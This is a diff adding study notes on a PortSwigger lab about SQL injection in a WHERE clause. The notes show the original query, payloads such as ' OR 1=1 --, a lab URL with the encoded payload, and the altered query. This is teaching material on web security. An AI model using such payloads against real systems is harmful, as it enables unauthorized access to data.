@@ -87,6 +87,35 @@ $result = $stmt->get_result();
 #### 2.1.1 Manual Exploitation via manipulating the URL
 
 - [Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
+  > Actual SQL Query
+
+```sql
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+```
+
+> SQL Payloads
+
+```sql
+'
+'--
+
+-- To display all the products (Released and Unreleased)
+' OR 1=1 --
+```
+
+> URL after injection Payload
+>
+> > Notice URL encoding here.
+
+```url
+https://0a6c002a040e04efc00f4f2b00950098.web-security-academy.net/filter?category=Accessories%27+OR+1=1--
+```
+
+> SQL Statement behind the scene after injection
+
+```sql
+SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1
+```
 
 #### 2.1.2 Writing a Python Script to automate the exploitation process
 
